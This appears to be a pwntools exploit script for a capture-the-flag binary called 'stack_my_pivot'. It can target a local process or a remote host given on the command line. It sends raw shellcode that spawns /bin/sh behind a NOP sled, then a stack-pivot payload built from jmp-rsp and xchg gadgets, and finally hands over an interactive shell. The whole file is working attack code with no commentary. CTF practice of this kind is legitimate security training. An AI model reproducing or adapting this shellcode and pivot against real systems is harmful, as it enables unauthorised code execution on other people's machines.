from pwn import (
    asm,
    args,
    gdb,
    remote,
    process,
    p64,
    u64,
    flat,
    ROP,
    ELF,
    context,
    log,
    sys,
    warnings,
    shellcraft,
)


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


warnings.filterwarnings("ignore")
gdbscript = """
init-pwndbg
b *0x40079a
continue
""".format(**locals())

exe = "./stack_my_pivot"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"
context.terminal = "kitty"

io = start()
offset = 24

jmp_rsp = 0x400738
xchg_rsp_rsi = 0x400732


shellcode = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05".rjust(
    48, b"\x90"
)

io.sendline(shellcode)

payload = flat(
    [b"\x90" * 8, jmp_rsp, asm("sub rsp, 0x40; jmp rsp; nop; nop"), xchg_rsp_rsi]
)

io.sendline(payload)

io.interactive()
